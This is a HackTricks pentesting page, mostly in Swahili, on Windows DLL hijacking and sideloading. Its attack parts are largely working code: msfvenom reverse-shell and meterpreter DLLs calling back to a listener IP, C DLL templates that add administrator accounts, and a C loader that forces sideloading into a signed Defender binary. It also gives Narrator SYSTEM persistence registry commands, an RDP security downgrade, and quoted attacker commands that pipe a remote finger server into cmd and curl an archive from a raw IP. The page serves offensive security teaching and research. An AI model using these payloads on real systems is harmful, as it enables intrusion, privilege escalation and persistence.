# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kuingilia programu iliyothibitishwa ili ipakishe DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumiwa hasa kwa ajili ya code execution, kupata persistence, na, kwa kawaida kidogo, privilege escalation. Licha ya kuzingatia escalation hapa, mbinu ya hijacking inabaki ile ile kwa malengo tofauti.

### Mbinu za Kawaida

Mbinu kadhaa zinatumiwa kwa DLL hijacking, kila moja ikiwa na ufanisi wake kulingana na mkakati wa programu wa kupakia DLL:

1. **DLL Replacement**: Kubadilisha DLL halisi na moja hasidi, hiari kutumia DLL Proxying ili kuhifadhi utendaji wa DLL asili.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi katika njia ya utafutaji kabla ya ile halali, kutumia muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo programu itapakia ikidhani ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kubadilisha vigezo vya utafutaji kama %PATH% au faili .exe.manifest / .exe.local ili kuielekeza programu kwa DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na toleo hasidi katika saraka ya WinSxS, njia inayohusishwa mara kwa mara na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyokopiwa, ikifanana na mbinu za Binary Proxy Execution.

> [!TIP]
> Kwa mnyororo wa hatua kwa hatua unaoweka HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, angalia workflow hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kupata Dll Zilizokosekana

Njia ya kawaida zaidi ya kupata Dll zinazokosekana ndani ya mfumo ni kukimbiza [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kuweka** **filter hizi 2 zifuatazo**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

na onyesha tu **File System Activity**:

![](<../../../images/image (153).png>)

Ikiwa unatafuta **missing dlls in general** unaacha hii ikifanye kazi kwa **sekunde** chache.\
If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" `<exec name>`, execute it, and stop capturing events**.

## Kutumia Dll Zilizokosekana

Ili kuongeza privileges, nafasi bora ni kuwa tunaweza **kuandika dll ambayo process yenye privileges itajaribu kuipakia** katika baadhi ya **mahali ambapo itatafutwa**. Kwa hiyo, tunaweza **kuandika** dll katika **folder** ambapo **dll inatafutwa kabla** ya folder ambapo **dll asili** iko (hali isiyo ya kawaida), au tunaweza **kuandika kwenye folder fulani ambapo dll itatafutwa** na dll ya asili **haitaonekana** katika folder yoyote.

### Mpangilio wa Utafutaji wa Dll

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata jinsi Dll zinavyopakiwa hasa.**

Programu za Windows zinatafuta DLL kwa kufuata seti ya njia za utafutaji zilizowekwa mapema, zikifuata mfuatano maalum. Tatizo la DLL hijacking linapotokea wakati DLL hasidi imewekwa kimkakati katika moja ya saraka hizi, kuhakikisha inapakiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia njia kamili (absolute paths) inaporejea kwa DLL zinazohitaji.

Unaweza kuona mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit hapa chini:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Huo ndio mpangilio wa utafutaji wa default ukiwa SafeDllSearchMode imewezeshwa. Wakati imezimwa, saraka ya sasa inasogezwa hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza thamani ya rejista HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode na uiweke kuwa 0 (default imewezeshwa).

Iwapo function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) itaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji unaanza katika saraka ya module ya executable ambayo **LoadLibraryEx** inapakia.

Mwisho, kumbuka kwamba dll inaweza kupakiwa ikielezwa kwa njia kamili badala ya jina tu. Katika kesi hiyo dll hiyo itatafutwa tu katika njia hiyo (ikiwa dll ina dependencies yoyote, zitatafutwa kama zilivyopakiwa kwa jina pekee).

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji lakini sitaziambia hapa.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya juu ya kuathiri kwa uhakika njia ya utafutaji ya DLL ya process mpya iliyotengenezwa ni kuweka field ya DllPath ndani ya RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia native APIs za ntdll. Kwa kutoa saraka inayodhibitiwa na mshambuliaji hapa, process ya lengo inayotatua DLL iliyoozwa kwa jina (bila njia kamili na isiyotumia flag za loading salama) inaweza kulazimishwa kupakia DLL hasidi kutoka saraka hiyo.

Wazo kuu
- Jenga process parameters kwa RtlCreateProcessParametersEx na utoe DllPath ya kawaida inayoonyesha folda yako unaodhibiti (mfano, saraka ambako dropper/unpacker wako iko).
- Unda process kwa RtlCreateUserProcess. Wakati binary la lengo linapotatua DLL kwa jina, loader itatafuta DllPath uliotolewa wakati wa utatuzi, kuruhusu sideloading yenye ufanisi hata DLL hasidi isipokuwa colocated na EXE ya lengo.

Vidokezo/vizuiizi
- Hii inaathiri child process inayoundwa; ni tofauti na SetDllDirectory, ambayo inaathiri process ya sasa pekee.
- Lengo lazima li-import au LoadLibrary DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na hardcoded absolute paths haiwezi kuibiwa. Forwarded exports na SxS zinaweza kubadilisha upendeleo.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll yenye madhumuni mabaya (ikitoa functions zinazohitajika au ikifanyia proxy ile halisi) katika saraka yako ya DllPath.
- Anzisha binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu iliyoelezwa hapo juu. Loader itatatua import kupitia DllPath iliyotolewa na itasideload DLL yako.

Mbinu hii imeonekana inatumiwa kwa njia halisi kuendesha mnyororo wa sideloading ya hatua nyingi: launcher ya awali inameza helper DLL, ambayo kisha huanzisha binary iliyosainiwa na Microsoft, inayoweza kuingiliwa, ikiwa na DllPath maalum ili kulazimisha upakiaji wa DLL ya mshambuliaji kutoka kwenye saraka ya staging.

#### Exceptions on dll search order from Windows docs

Tukio maalum fulani kwa mpangilio wa utafutaji wa DLL zimeelezewa katika nyaraka za Windows:

- Wakati **DLL inayoshiriki jina na ile tayari iliyopakiwa kwenye memory** inapotumwa, mfumo hupita utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa redirection na manifesti kabla ya kurudi kwa DLL iliyopo kwenye memory. **Katika hali hii, mfumo haufanyi utafutaji wa DLL**.
- Katika matukio ambapo DLL inatambulika kama **Known DLL** kwa toleo la sasa la Windows, mfumo utatumia toleo lake la known DLL, pamoja na DLL zake zote zinazotegemea, **kutokuwatafuta**. Key ya registry **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** inaorodhesha Known DLL hizi.
- Iwapo **DLL ina dependencies**, utafutaji wa DLL hizo tegemezi hufanywa kana kwamba zilioneshwa kwa jina la **module** pekee, bila kujali iwapo DLL ya awali ilitambulika kwa njia ya path kamili.

### Kupandisha Ruhusa

**Requirements**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi chini ya **different privileges** (horizontal or lateral movement), ambao **unakosa DLL**.
- Hakikisha **write access** inapatikana kwa **directory** yoyote ambapo **DLL** itatafutwa. Mahali hapa kunaweza kuwa saraka ya executable au saraka ndani ya system path.

Ndiyo, masharti ni magumu kuyapata kwani **kwa default ni nadra kupata executable yenye ruhusa iliyokosa dll** na ni hata **kabla ya kushangaza kuwa na ruhusa za kuandika kwenye folda ya system path** (huwezi kwa default). Lakini, katika mazingira yaliyopangwa vibaya hili linawezekana.\
Ikiwa uko na bahati na unapata unakidhi vigezo, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi ni bypass UAC**, unaweza kukuta hapo **PoC of a Dll hijaking** kwa toleo la Windows ambalo unaweza kutumia (labda kwa kubadili tu path ya folda ambayo una ruhusa za kuandika).

Kumbuka kwamba unaweza **kuangalia ruhusa zako katika folda** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa kutumia:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili kuhusu jinsi ya **kutumia Dll Hijacking kuinua ruhusa** ukiwa na idhini ya kuandika katika **System Path folder** angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za otomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itakagua ikiwa una ruhusa ya kuandika katika folda yoyote ndani ya system PATH.\
Zana nyingine za kuvutia za otomatiki za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Iwapo utapata hali inayoweza kutumiwa, mojawapo ya mambo muhimu zaidi ili kuitekeleza kwa mafanikio itakuwa **kuunda dll inayotoa angalau functions zote ambazo executable itaitumia kutoka kwake**. Hata hivyo, kumbuka kwamba Dll Hijacking inakuwa muhimu ili [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa dll hijacking uliolenga dll hijacking kwa utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **misimbo ya msingi ya dll** ambayo inaweza kuwa muhimu kama **templates** au kuunda **dll yenye functions zisizohitajika zilizo-exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Kwa msingi, **Dll proxy** ni Dll inayoweza **kutekeleza msimbo wako wa kuharibu unapopakuliwa** lakini pia **kuweka wazi** na **kufanya kazi** kama **inavyotarajiwa** kwa **kupitisha wito wote kwa maktaba halisi**.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kwa kweli **kuteua executable na kuchagua library** unayotaka ku-proxify na **kuzalisha proxified dll** au **kuteua Dll** na **kuzalisha proxified dll**.

### **Meterpreter**

**Pata rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86, sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kwamba katika baadhi ya kesi Dll unayoi-compile lazima **export several functions** ambazo zitatakiwa na mchakato wa mhanga; ikiwa functions hizi hazipo, basi **binary won't be able to load** na **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Mfano wa C++ DLL kwa uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL mbadala ya C yenye thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Somo la Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado inajaribu kupakia DLL ya localization inayoweza kutabirika na maalum kwa lugha wakati wa kuanzishwa; DLL hii inaweza ku-hijack ili kutekeleza arbitrary code execution na persistence.

Mambo muhimu
- Njia ya uchunguzi (majengo ya sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya legacy (majengo ya zamani): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Iwapo DLL inayoweza kuandikwa na iliyodhibitiwa na mshambuliaji ipo katika njia ya OneCore, inapakiwa na `DllMain(DLL_PROCESS_ATTACH)` hufanywa. Hakuna exports zinazohitajika.

Ugunduzi kwa Procmon
- Chujio: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Anzisha Narrator na angalia jaribio la kupakia njia iliyo hapo juu.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Hijack isiyo ya kitaalamu itatoa sauti/ikuze UI. Ili kubaki kimya, unapo-attach orodhesha threads za Narrator, fungua main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` ili kuiweka kusitishwa; endelea katika thread yako mwenyewe. See PoC for full code.

Trigger and persistence via Accessibility configuration
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa mambo hapo juu, kuanzisha Narrator kutapakia DLL iliyopangwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Fanya RDP kwa host, kwenye logon screen bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji unasimama wakati session ya RDP inafungwa—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili entry ya registry ya built-in Accessibility Tool (AT) (kwa mfano, CursorIndicator), ui-edit ili iielekeze kwa binary/DLL yoyote, u-i-import, kisha weka `configuration` kwa jina hilo la AT. Hii inatoa njia ya utekelezaji wowote ndani ya mfumo wa Accessibility.

Notes
- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuishi katika `DLL_PROCESS_ATTACH`; hakuna exports zinazohitajika.

## Somo la Kesi: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Mfano huu unaonyesha **Phantom DLL Hijacking** katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), iliyofuatiliwa kama **CVE-2025-1729**.

### Maelezo ya Udhaifu

- **Sehemu**: `TPQMAssistant.exe` iliyoko `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` inaendesha kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliyeingia.
- **Directory Permissions**: Inaweza kuandikwa na `CREATOR OWNER`, ikiruhusu watumiaji wa ndani kuweka faili yoyote.
- **DLL Search Behavior**: Inajaribu kupakia `hostfxr.dll` kutoka kwenye directory ya kazi kwanza na inaandika "NAME NOT FOUND" ikiwa haipo, ikibainisha upendeleo wa kutafuta kwenye directory ya ndani.

### Exploit Implementation

Mshambuliaji anaweza kuweka stub ya `hostfxr.dll` yenye madhara katika directory ileile, akitumia DLL iliyokosekana kupata utekelezaji wa code chini ya muktadha wa mtumiaji:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Mtiririko wa Shambulio

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyopangwa ifanye kazi saa 9:30 AM chini ya muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati kazi inatekelezwa, DLL ya hatari itafanya kazi katika kikao cha msimamizi kwa medium integrity.
4. Unganisha mbinu za kawaida za UAC bypass ili kuinua kutoka medium integrity hadi SYSTEM privileges.

## Utafiti wa Kesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Watendaji wa tishio mara nyingi huunganisha MSI-based droppers na DLL side-loading ili kutekeleza payloads chini ya mchakato unaoaminika na signed.

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. A CustomAction inafanya kazi kimya wakati wa usakinishaji wa GUI (mfano, LaunchApplication au vitendo vya VBScript), ikijenga tena hatua inayofuata kutoka kwa rasilimali zilizowekwa ndani.
- Dropper inaandika EXE halali iliyosainiwa na DLL ya hatari katika saraka moja (mfano: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wakati signed EXE inaanzishwa, Windows DLL search order inachukua wsc.dll kutoka working directory kwanza, ikitekeleza code ya mshambuliaji chini ya parent iliyosainiwa (ATT&CK T1574.001).

Uchambuzi wa MSI (kile cha kuangalia)
- CustomAction table:
- Angalia entries ambazo zinaendesha executables au VBScript. Mfano wa muundo wa kushukiwa: LaunchApplication ikitekeleza faili iliyowekwa ndani kimya.
- Katika Orca (Microsoft Orca.exe), chunguza CustomAction, InstallExecuteSequence na Binary tables.
- Embedded/split payloads katika MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Tafuta vipande vidogo vingi vinavyounganishwa na kufichuliwa na VBScript CustomAction. Mtiririko wa kawaida:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading ya vitendo na wsc_proxy.exe
- Weka mafaili haya mawili katika folda moja:
- wsc_proxy.exe: legitimate signed host (Avast). Mchakato unajaribu kupakia wsc.dll kwa jina kutoka katika saraka yake.
- wsc.dll: attacker DLL. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, jenga proxy DLL na forward exports zinazohitajika kwa maktaba halisi huku ukitekeleza payload katika DllMain.
- Jenga payload ndogo ya DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia proxying framework (mfano, DLLirant/Spartacus) kuunda forwarding DLL ambayo pia inatekeleza payload yako.

- Mbinu hii inategemea DLL name resolution na host binary. Ikiwa host inatumia absolute paths au safe loading flags (mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri precedence na lazima zichukuliwe wakati wa kuchagua host binary na export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ilielezea jinsi Ink Dragon inavyoweka ShadowPad kwa kutumia **three-file triad** ili kuendana na software halali huku core payload ikiwa encrypted kwenye disk:

1. **Signed host EXE** – wauzaji kama AMD, Realtek, au NVIDIA wanatumiwa (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Wavamizi wanabadilisha jina la executable kuonekana kama Windows binary (kwa mfano `conhost.exe`), lakini Authenticode signature inabaki kuwa halali.
2. **Malicious loader DLL** – inaruhusiwa kando na EXE kwa jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL hii kawaida ni MFC binary iliyofichwa kwa ScatterBrain framework; kazi yake pekee ni kutafuta encrypted blob, kuidecrypt, na ku-reflectively map ShadowPad.
3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` katika directory ile ile. Baada ya memory-mapping decrypted payload, loader inafuta faili la TMP ili kuharibu ushahidi wa forensics.

Tradecraft notes:

* Kubadilisha jina la signed EXE (wakati ukidumisha OriginalFileName asili katika PE header) inaiwezesha kujifanya Windows binary lakini ikaimarisha vendor signature, hivyo rudi tabia ya Ink Dragon ya kuweka binaries zinazoonekana `conhost.exe` ambazo kwa kweli ni utilities za AMD/NVIDIA.
* Kwa sababu executable inabaki kuaminiwa, controls nyingi za allowlisting zinahitaji tu malicious DLL yako kuwepo kando nayo. Lenga kubinafsisha loader DLL; signed parent kwa kawaida inaweza kukimbia bila kubadilishwa.
* ShadowPad’s decryptor inatarajia TMP blob kuwa kando ya loader na iwe writable ili iweze kuifuta (zero) faili baada ya mapping. Weka directory iwe writable hadi payload ianze; mara ikipo katika memory, faili la TMP linaweza kufutwa kwa usalama kwa OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators wanapanganya DLL sideloading na LOLBAS ili artefact pekee ya custom kwenye disk iwe malicious DLL kando na trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell inazindua `cmd.exe /c`, inachukua commands kutoka Finger server, na kuzipipa kwa `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` inachukua TCP/79 text; `| cmd` inatekeleza response ya server, ikiruhusu operators kuzungusha second stage server-side.

- **Built-in download/extract:** Pakua archive yenye extension benign, ifungue, na ipange sideload target pamoja na DLL chini ya folda ya nasibu `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` inaficha progress na inafuata redirects; `tar -xf` inatumia tar iliyojengwa ndani ya Windows.

- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe process iliyotengenezwa na CIM wakati inapopakua DLL iliyo nayo:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Inafanya kazi na binaries zinazopendelea local DLLs (mfano, `intelbq.exe`, `nearby_share.exe`); payload (mfano, Remcos) inaendesha chini ya jina lililo trusted.

- **Hunting:** Toa alert kwa `forfiles` wakati `/p`, `/m`, na `/c` zinaonekana pamoja; jambo hili si la kawaida isipokuwa kwenye admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Infiltration ya hivi karibuni ya Lotus Blossom ilitumia trusted update chain kupeleka NSIS-packed dropper ambayo ili-stage DLL sideload pamoja na payloads zote zikifanya kazi katika memory.

Tradecraft flow
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, inaiweka **HIDDEN**, huacha Bitdefender Submission Wizard iliyobadilishwa jina `BluetoothService.exe`, `log.dll` ya uharibifu, na encrypted blob `BluetoothService`, kisha inaiwasha EXE.
